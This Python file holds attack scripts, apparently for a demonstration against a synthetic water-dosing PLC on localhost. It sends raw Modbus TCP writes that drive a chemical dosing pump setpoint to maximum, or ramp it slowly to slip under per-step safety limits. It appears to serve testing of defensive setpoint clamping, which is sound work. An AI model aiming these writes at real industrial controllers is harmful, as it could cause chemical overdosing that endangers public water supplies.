"""Deterministic Attack Scripts for AquaPhy Live Demonstration (Phase 5).

Provides deterministic network attacks against the Modbus TCP dosing setpoint:
    Attack 1: Acute Setpoint Jump (Sudden maximum dosing spike u = 1.0)
    Attack 2: Low-and-Slow Creeping Ramp (Incremental drift exceeding cumulative mass budget)

Both attacks transmit real Modbus TCP FC06 packets to the target port.
"""

from __future__ import annotations
from pathlib import Path
import socket
import struct
import sys
import time
from typing import Any, Dict, List, Optional, Tuple

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from src.plc.synthetic_plc import (
    ModbusRegisters,
    PUMP_SCALE,
    FLOW_SCALE,
    CONC_SCALE,
    MASS_SCALE,
)


def send_modbus_setpoint(
    host: str = "127.0.0.1",
    port: int = 5020,
    u_command: float = 0.40,
    timeout: float = 1.0,
    trans_id: int = 1,
) -> Tuple[bool, float, Optional[str]]:
    """Send a Modbus FC06 write for the pump setpoint register.

    Returns:
        (success, returned_setpoint, error_string)
    """
    u_clamped = max(0.0, min(1.0, float(u_command)))
    raw_val = int(round(u_clamped * PUMP_SCALE))

    pdu = struct.pack(">BHH", 0x06, ModbusRegisters.PUMP_SETPOINT, raw_val)
    header = struct.pack(">HHHB", trans_id, 0, len(pdu) + 1, 1)

    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(header + pdu)

        resp_header = b""
        while len(resp_header) < 7:
            chunk = sock.recv(7 - len(resp_header))
            if not chunk:
                return False, 0.0, "Socket closed by peer"
            resp_header += chunk

        _, _, r_len, _ = struct.unpack(">HHHB", resp_header)
        resp_pdu = b""
        while len(resp_pdu) < (r_len - 1):
            chunk = sock.recv((r_len - 1) - len(resp_pdu))
            if not chunk:
                return False, 0.0, "Socket closed during PDU"
            resp_pdu += chunk

        if resp_pdu[0] & 0x80:
            err_code = resp_pdu[1] if len(resp_pdu) > 1 else 0
            return False, 0.0, f"Modbus Exception 0x{err_code:02X}"

        returned_addr, returned_val = struct.unpack(">HH", resp_pdu[1:5])
        return True, returned_val / PUMP_SCALE, None

    except Exception as ex:
        return False, 0.0, str(ex)
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


def read_telemetry(
    host: str = "127.0.0.1",
    port: int = 5020,
    timeout: float = 1.0,
    trans_id: int = 2,
) -> Optional[Dict[str, Any]]:
    """Read all diagnostic holding registers (0..6) from Modbus server."""
    pdu = struct.pack(">BHH", 0x03, 0, 7)
    header = struct.pack(">HHHB", trans_id, 0, len(pdu) + 1, 1)

    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(header + pdu)

        resp_header = b""
        while len(resp_header) < 7:
            chunk = sock.recv(7 - len(resp_header))
            if not chunk:
                return None
            resp_header += chunk

        _, _, r_len, _ = struct.unpack(">HHHB", resp_header)
        resp_pdu = b""
        while len(resp_pdu) < (r_len - 1):
            chunk = sock.recv((r_len - 1) - len(resp_pdu))
            if not chunk:
                return None
            resp_pdu += chunk

        if resp_pdu[0] != 0x03 or len(resp_pdu) < (2 + 14):
            return None

        regs = struct.unpack(">HHHHHHH", resp_pdu[2:16])
        status_names = {
            0: "NORMAL",
            1: "CLAMPED_INSTANTANEOUS",
            2: "CLAMPED_CUMULATIVE",
            3: "FAILSAFE_HOLD",
        }

        return {
            "pump_setpoint": regs[0] / PUMP_SCALE,
            "flow_rate": regs[1] / FLOW_SCALE,
            "concentration": regs[2] / CONC_SCALE,
            "status_code": regs[3],
            "status_name": status_names.get(regs[3], "UNKNOWN"),
            "cumulative_excess": regs[4] / MASS_SCALE,
            "nominal_baseline": regs[5] / PUMP_SCALE,
            "instantaneous_ceiling": regs[6] / PUMP_SCALE,
        }
    except Exception:
        return None
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


def run_acute_attack(
    host: str = "127.0.0.1",
    port: int = 5020,
    spike_u: float = 1.0,
    steps: int = 15,
    interval: float = 0.1,
) -> List[Dict[str, Any]]:
    """Execute Attack 1: Sudden acute setpoint jump to maximum (u = 1.0)."""
    logs: List[Dict[str, Any]] = []
    print(f"[ATTACK 1] Initiating acute setpoint spike (u = {spike_u:.2f}) -> {host}:{port}")

    for step in range(steps):
        t0 = time.monotonic()
        ok, returned_u, err = send_modbus_setpoint(host, port, spike_u, trans_id=1000 + step)
        telem = read_telemetry(host, port, trans_id=2000 + step)

        entry = {
            "step": step,
            "u_req": spike_u,
            "u_safe_returned": returned_u if ok else None,
            "error": err,
            "telemetry": telem,
        }
        logs.append(entry)

        status_str = telem["status_name"] if telem else ("OK" if ok else f"ERR: {err}")
        conc_str = f"C={telem['concentration']:.2f} mg/L" if telem else ""
        print(f"  [Step {step:02d}] Req={spike_u:.2f} | SafeReturned={returned_u:.2f} | {conc_str} | State={status_str}")

        elapsed = time.monotonic() - t0
        time.sleep(max(0.0, interval - elapsed))

    return logs


def run_slow_ramp_attack(
    host: str = "127.0.0.1",
    port: int = 5020,
    start_u: float = 0.40,
    max_ramp_u: float = 0.55,
    ramp_step: float = 0.005,
    steps: int = 35,
    interval: float = 0.1,
) -> List[Dict[str, Any]]:
    """Execute Attack 2: Low-and-slow incremental creeping ramp.

    Dosing increases in tiny increments above nominal 0.40, individually
    staying below instantaneous ceiling, but gradually exhausting cumulative budget.
    """
    logs: List[Dict[str, Any]] = []
    print(f"[ATTACK 2] Initiating low-and-slow creeping ramp ({start_u:.2f} -> {max_ramp_u:.2f}) -> {host}:{port}")

    current_u = start_u
    for step in range(steps):
        t0 = time.monotonic()
        current_u = min(max_ramp_u, current_u + ramp_step)

        ok, returned_u, err = send_modbus_setpoint(host, port, current_u, trans_id=3000 + step)
        telem = read_telemetry(host, port, trans_id=4000 + step)

        entry = {
            "step": step,
            "u_req": current_u,
            "u_safe_returned": returned_u if ok else None,
            "error": err,
            "telemetry": telem,
        }
        logs.append(entry)

        status_str = telem["status_name"] if telem else ("OK" if ok else f"ERR: {err}")
        m_excess_str = f"M_excess={telem['cumulative_excess']:.1f} mg" if telem else ""
        conc_str = f"C={telem['concentration']:.2f} mg/L" if telem else ""
        print(f"  [Step {step:02d}] Req={current_u:.3f} | SafeReturned={returned_u:.3f} | {m_excess_str} | {conc_str} | State={status_str}")

        elapsed = time.monotonic() - t0
        time.sleep(max(0.0, interval - elapsed))

    return logs
